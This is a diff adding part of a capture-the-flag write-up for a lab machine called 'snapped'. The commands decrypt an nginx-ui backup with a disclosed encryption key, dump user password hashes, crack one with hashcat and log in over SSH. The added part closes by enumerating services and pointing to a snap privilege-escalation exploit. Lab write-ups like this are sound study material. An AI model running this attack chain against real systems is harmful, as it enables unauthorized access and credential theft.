@@ -167,3 +167,180 @@ nginx.zip:     data
 ```
 
 Google `nginx ui 2.3.2 vulnerabilities`
+
+[Unauthenticated Backup Download with Encryption Key Disclosure](https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-g9w5-qffc-6762)
+
+```bash
+echo SBrGn6ihR688j7eQN+SccwrVgsLdmjDlbpUcxK8vyZI= | base64 -d | xxd -p -c 0
+481ac69fa8a147af3c8fb79037e49c730ad582c2dd9a30e56e951cc4af2fc992
+echo AmAYDWgso7L0bIP7ubGwwg== | base64 -d | xxd -p -c 0
+0260180d682ca3b2f46c83fbb9b1b0c2
+openssl enc -aes-256-cbc -d -in hash_info.txt -out hash_info_dec.txt -K 481ac69fa8a147af3c8fb79037e49c730ad582c2dd9a30e56e951cc4af2fc992 -iv 0260180d682ca3b2f46c83fbb9b1b0c2
+cat hash_info_dec.txt
+nginx-ui_hash: a2e0c331c691f5bdfafedaf1ac5f419d5db5164f359d5cca9fabd879b3e01f54
+nginx_hash: b14a4fe4c6f7bd3f21e24b6ad4d0667afed6e625ada94105f91bd620eebf6e08
+timestamp: 20260602-163419
+version: 2.3.2
+openssl enc -aes-256-cbc -d -in nginx.zip -out nginx_dec.zip -K 481ac69fa8a147af3c8fb79037e49c730ad582c2dd9a30e56e951cc4af2fc992 -iv 0260180d682ca3b2f46c83fbb9b1b0c2
+openssl enc -aes-256-cbc -d -in nginx-ui.zip -out nginx-ui_dec.zip -K 481ac69fa8a147af3c8fb79037e49c730ad582c2dd9a30e56e951cc4af2fc992 -iv 0260180d682ca3b2f46c83fbb9b1b0c2
+file *_dec*
+hash_info_dec.txt: ASCII text
+nginx_dec.zip:     Zip archive data, made by v2.0 UNIX, extract using at least v2.0, last modified Jun 02 2026 20:34:18, uncompressed size 0, method=store
+nginx-ui_dec.zip:  Zip archive data, made by v2.0 UNIX, extract using at least v2.0, last modified Jun 02 2026 20:34:18, uncompressed size 2295, method=deflate
+sha256sum nginx*_dec.zip
+b14a4fe4c6f7bd3f21e24b6ad4d0667afed6e625ada94105f91bd620eebf6e08  nginx_dec.zip
+a2e0c331c691f5bdfafedaf1ac5f419d5db5164f359d5cca9fabd879b3e01f54  nginx-ui_dec.zip
+mkdir nginx
+unzip nginx_dec.zip -d nginx
+cat sites-available/snapped
+server {
+    listen 80 default_server;
+    server_name snapped.htb;
+
+    root /var/www/html/snapped;
+    index index.html;
+
+
+
+    if ($host != snapped.htb) {
+        rewrite ^ http://snapped.htb/;
+
+    }
+    location / {
+        try_files $uri $uri/ =404;
+    }
+}
+cat sites-available/nginx-ui
+server {
+    listen 80;
+    server_name admin.snapped.htb;
+
+    location / {
+        proxy_pass http://127.0.0.1:9000;
+
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
+
+        proxy_http_version 1.1;
+        proxy_set_header Upgrade $http_upgrade;
+        proxy_set_header Connection "upgrade";
+    }
+}
+mkdir nginx-ui
+unzip nginx-ui_dec.zip -d nginx-ui
+file database.db
+database.db: SQLite 3.x database, last written using SQLite version 3050004, file counter 83, database pages 64, cookie 0x39, schema 4, UTF-8, version-valid-for 83
+sqlite> .schema users
+CREATE TABLE `users` (`id` integer PRIMARY KEY AUTOINCREMENT,`created_at` datetime,`updated_at` datetime,`deleted_at` datetime,`name` text,`password` text,`status` numeric DEFAULT true,`otp_secret` blob,`recovery_codes` text,`language` text DEFAULT "en");
+CREATE INDEX `idx_users_deleted_at` ON `users`(`deleted_at`);
+sqlite> select name,password from users;
+╭──────────┬──────────────────────────────────────────────────────────────╮
+│ admin    │ $2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm │
+│ jonathan │ $2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq │
+╰──────────┴──────────────────────────────────────────────────────────────╯
+echo '$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq' > jonathan_hash.txt
+hashcat --identify jonathan_hash.txt
+The following 6 hash-modes match the structure of your input hash:
+
+      # | Name                                                       | Category
+  ======+============================================================+======================================
+  25600 | bcrypt(md5($pass))                                         | Generic KDF
+  25800 | bcrypt(sha1($pass))                                        | Generic KDF
+  30600 | bcrypt(sha256($pass))                                      | Generic KDF
+  28400 | bcrypt(sha512($pass))                                      | Generic KDF
+   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
+  33800 | WBB4 (Woltlab Burning Board) [bcrypt(bcrypt($pass))]       | Forums, CMS, E-Commerce
+hashcat -m 3200 jonathan_hash.txt /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
+$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq:linkinpark
+nxc ssh snapped.htb -u jonathan -p linkinpark
+SSH         10.129.14.169   22     snapped.htb      [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.15
+SSH         10.129.14.169   22     snapped.htb      [+] jonathan:linkinpark  Linux - Shell access!
+ssh jonathan@snapped.htb
+jonathan@snapped:~$ cat user.txt
+db5204049a6f2ed9285602d28a6782b5
+systemctl list-units --type=service --state=running
+  UNIT                          LOAD   ACTIVE SUB     DESCRIPTION
+  accounts-daemon.service       loaded active running Accounts Service
+  avahi-daemon.service          loaded active running Avahi mDNS/DNS-SD Stack
+  colord.service                loaded active running Manage, Install and Generate Color Profiles
+  cron.service                  loaded active running Regular background program processing daemon
+  cups-browsed.service          loaded active running Make remote CUPS printers available locally
+  cups.service                  loaded active running CUPS Scheduler
+  dbus.service                  loaded active running D-Bus System Message Bus
+  fwupd.service                 loaded active running Firmware update daemon
+  gdm.service                   loaded active running GNOME Display Manager
+  gnome-remote-desktop.service  loaded active running GNOME Remote Desktop
+  kerneloops.service            loaded active running Tool to automatically collect and submit kernel crash signatures
+  ModemManager.service          loaded active running Modem Manager
+  NetworkManager.service        loaded active running Network Manager
+  nginx-ui.service              loaded active running nginx-ui
+  nginx.service                 loaded active running A high performance web server and a reverse proxy server
+  open-vm-tools.service         loaded active running Service for virtual machines hosted on VMware
+  polkit.service                loaded active running Authorization Manager
+  power-profiles-daemon.service loaded active running Power Profiles daemon
+  rsyslog.service               loaded active running System Logging Service
+  rtkit-daemon.service          loaded active running RealtimeKit Scheduling Policy Service
+  snapd.service                 loaded active running Snap Daemon
+  ssh.service                   loaded active running OpenBSD Secure Shell server
+  switcheroo-control.service    loaded active running Switcheroo Control Proxy service
+  systemd-journald.service      loaded active running Journal Service
+  systemd-logind.service        loaded active running User Login Management
+  systemd-oomd.service          loaded active running Userspace Out-Of-Memory (OOM) Killer
+  systemd-resolved.service      loaded active running Network Name Resolution
+  systemd-timesyncd.service     loaded active running Network Time Synchronization
+  systemd-udevd.service         loaded active running Rule-based Manager for Device Events and Files
+  udisks2.service               loaded active running Disk Manager
+  upower.service                loaded active running Daemon for power management
+  user@1000.service             loaded active running User Manager for UID 1000
+  user@120.service              loaded active running User Manager for UID 120
+  vgauth.service                loaded active running Authentication service for virtual machines hosted on VMware
+  wpa_supplicant.service        loaded active running WPA supplicant
+jonathan@snapped:~$ snap version
+snap    2.63.1+24.04
+snapd   2.63.1+24.04
+series  16
+ubuntu  24.04
+kernel  6.17.0-19-generic
+Google snap 2.63.1 vulnerabilities
+https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE
+systemctl cat systemd-tmpfiles-clean.timer
+# /usr/lib/systemd/system/systemd-tmpfiles-clean.timer
+#  SPDX-License-Identifier: LGPL-2.1-or-later
+#
+#  This file is part of systemd.
+#
+#  systemd is free software; you can redistribute it and/or modify it
+#  under the terms of the GNU Lesser General Public License as published by
+#  the Free Software Foundation; either version 2.1 of the License, or
+#  (at your option) any later version.
+
+[Unit]
+Description=Daily Cleanup of Temporary Directories
+Documentation=man:tmpfiles.d(5) man:systemd-tmpfiles(8)
+ConditionPathExists=!/etc/initrd-release
+
+[Timer]
+OnBootSec=15min
+OnUnitActiveSec=1d
+
+# /etc/systemd/system/systemd-tmpfiles-clean.timer.d/override.conf
+[Timer]
+OnBootSec=1m
+OnUnitActiveSec=1m
+cat /usr/lib/tmpfiles.d/tmp.conf
+#  This file is part of systemd.
+#
+#  systemd is free software; you can redistribute it and/or modify it
+#  under the terms of the GNU Lesser General Public License as published by
+#  the Free Software Foundation; either version 2.1 of the License, or
+#  (at your option) any later version.
+
+# See tmpfiles.d(5) for details
+
+# Clear tmp directories separately, to make them easier to override
+D /tmp 1777 root root 4m
+#q /var/tmp 1777 root root 30d
+
+```
